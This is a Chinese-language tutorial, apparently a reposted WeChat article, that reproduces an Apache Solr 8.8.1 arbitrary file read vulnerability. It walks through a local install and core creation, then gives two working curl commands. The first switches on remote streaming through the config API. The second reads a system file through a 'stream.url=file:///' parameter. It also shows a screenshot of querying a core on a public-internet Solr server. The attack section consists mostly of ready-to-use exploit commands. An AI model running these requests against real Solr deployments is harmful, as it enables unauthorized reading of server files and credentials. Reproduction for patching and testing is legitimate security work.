> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/JYu4G2A9wedzxmV3LSdgww)

环境搭建
----

下载地址：http://archive.apache.org/dist/lucene/solr/

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCmVPSTekwkrmLdCqm4p3via3TH00939ob9ItIdiaGKSBh9CFX3qLRtG1YYicT2e5b78YpEBias9Mia9w/640?wx_fmt=png)

下载最新版 8.8.1

启动：进入`bin`目录，`solr.cmd start -p 8983`

`-p`指定端口。

关闭服务：`solr.cmd stop -p 8983`.

查看 / 创建 Core
------------

新安装的 Solr 没有任何 core，可以使用如下方法创建一个 Core：

```
如果你们有使用示例的配置启动Solr，需要创建一个Core，以便能够索引和查询。可以通过执行下面的命令来完成：

1 solr.cmd create -c <name>

这个命令会创建一个Core，使用数据驱动Schema，它会在你添加文档做索引后尝试推断正确的字段类别。

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCmVPSTekwkrmLdCqm4p3vmOzp3vXOFf5Vial1eDwfzhWcABT6MQKSQguZZnls5fYwEAkrEzJLyOQ/640?wx_fmt=png)

访问接口：http://127.0.0.1:8983/solr/admin/cores?indexInfo=false&wt=json

接口可以查看官方文档：https://solr.apache.org/guide/8_8/coreadmin-api.html

成功看到创建的 core：`testcore`。

查看公网上某个 solr 的 core：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCmVPSTekwkrmLdCqm4p3vWYz7cFuqG9yfHOITXTG3ybUSPI0rEW378J3tFheNYXiaXeZUrvicAGpg/640?wx_fmt=png)

漏洞复现
----

### step 1

```
curl -d '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://127.0.0.1:8983/solr/testcore/config -H 'Content-type:application/json'

```

将上面的`testcore`换成你创建的 core / 存在的 core 名称。

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCmVPSTekwkrmLdCqm4p3vZZ3qAGnPa2YEgbt2YnAWIliaPvwicrz1Zy1cqyfVhCKekQy7WtGPtaDw/640?wx_fmt=png)

出现如上内容说明存在漏洞。如果返回结果是 404，说明请求的 core 名称不对。

### step 2

```
curl "http://127.0.0.1:8983/solr/testcore/debug/dump?param=ContentStreams" -F "stream.url=file:///
C:/Windows/system.ini"

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCmVPSTekwkrmLdCqm4p3viaUZPsic5jebib6YjRSb2ib6WFjLQicY3SYEkQx2xyhxCJSQZL67D2TnFlg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCmVPSTekwkrmLdCqm4p3vSr4ZsjYGbg0tBSIzKEZGlgH9n1RB0qt3SIUmcKtbWtxv0ics8hwSc7w/640?wx_fmt=png)

参考连接
----

[https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ](https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247493149&idx=1&sn=60e1253e8e3bada902f2a9f62282487d&scene=21#wechat_redirect)

[https://mp.weixin.qq.com/s/2D3bLaUVD6Lz7VqRu8dOGA](https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247484117&idx=1&sn=2fdab8cbe4b873f8dd8abb35d935d186&scene=21#wechat_redirect)

https://www.cnblogs.com/chen108/p/6196239.html